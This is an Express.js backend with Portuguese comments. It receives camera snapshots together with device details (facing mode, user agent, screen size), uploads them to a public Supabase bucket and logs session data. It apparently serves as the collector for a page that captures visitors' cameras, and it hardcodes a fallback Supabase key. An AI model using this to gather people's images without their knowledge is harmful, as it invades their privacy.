require('dotenv').config();
const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const { randomUUID } = require('crypto');
const path = require('path');
const app = express();

app.use(express.json({ limit: '10mb' }));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.get('/test', (req, res) => {
    console.log("=== ENDPOINT /TEST ACESSADO ===");
    res.json({ status: 'ok', message: 'Backend está funcionando', timestamp: new Date().toISOString() });
});

// Use as variáveis de ambiente, com fallback para desenvolvimento local
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qakdwubbzrkiojwgcyry.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFha2R3dWJienJraW9qd2djeXJ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI1MDcwNTEsImV4cCI6MjEwODA4MzA1MX0.YRRpbJiwTZ4JVmCF3E-tq4FwJOE96rhAVq0pOav7AVA';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const BUCKET_NAME = 'capturas';

// Endpoint para capturas de câmera
app.post('/api/captura', async (req, res) => {
    try {
        const { facingMode, image, userAgent, screenRes } = req.body;
        
        if (typeof image !== 'string' || !/^data:image\/jpeg;base64,[A-Za-z0-9+/]+={0,2}$/.test(image)) {
            return res.status(400).json({ error: 'Imagem JPEG inválida' });
        }

        const base64Data = image.slice('data:image/jpeg;base64,'.length);
        const binaryData = Buffer.from(base64Data, 'base64');
        if (!binaryData.length) return res.status(400).json({ error: 'Imagem vazia' });
        
        const fileName = `cap_${Date.now()}_${randomUUID()}.jpg`;
        
        const { error: uploadError } = await supabase.storage
            .from(BUCKET_NAME)
            .upload(fileName, binaryData, { contentType: 'image/jpeg' });

        if (uploadError) {
            console.error('Falha no Supabase Storage:', uploadError);
            return res.status(502).json({
                error: 'O Supabase recusou o envio da imagem',
                stage: 'storage',
                detail: uploadError.message
            });
        }

        // Obtém a URL pública da imagem
        const { data: { publicUrl } } = supabase.storage
            .from(BUCKET_NAME)
            .getPublicUrl(fileName);

        const { error: insertError } = await supabase.from('metadados').insert({
            timestamp: new Date().toISOString(),
            facing_mode: facingMode,
            user_agent: userAgent,
            screen_res: screenRes,
            image_url: publicUrl
        });

        if (insertError) {
            console.error('Imagem enviada, mas falha ao salvar metadados:', insertError);
            return res.status(502).json({
                error: 'Imagem enviada, mas os metadados não foram salvos',
                stage: 'database',
                detail: insertError.message,
                fileName
            });
        }

        console.log(`Imagem enviada para Supabase: ${publicUrl}`);
        res.status(200).json({ success: true, imageUrl: publicUrl });
    } catch (err) {
        console.error('Erro no /api/captura:', err);
        res.status(500).json({ error: err.message });
    }
});

// Endpoint para sessão final
app.post('/api/sessao_final', (req, res) => {
    const sessionData = req.body;
    console.log('Sessão finalizada:', sessionData);
    res.status(200).json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
